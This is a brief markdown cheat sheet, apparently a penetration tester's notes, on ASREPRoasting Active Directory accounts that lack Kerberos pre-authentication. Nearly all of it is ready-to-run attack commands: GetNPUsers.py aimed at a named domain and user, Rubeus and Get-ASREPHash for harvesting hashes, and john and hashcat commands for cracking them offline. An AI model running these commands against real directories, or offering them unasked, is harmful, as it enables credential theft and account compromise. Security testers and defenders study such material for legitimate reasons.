# Kerberos Attacks

## ASREPRoast 
If accounts do not require kerberos pre-authentication, the tool GetNPUsers.py can be used to do ASREPRoasting:   
`GetNPUsers.py -request am.mt.mtnet/us30-zherosheroes:`   
On Windows:   
`.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`   
`Get-ASREPHash -Username someuser123 -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)`   
Cracking:   
`john --wordlist=passwords_kerb.txt hashes.asreproast`   
`hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt`   
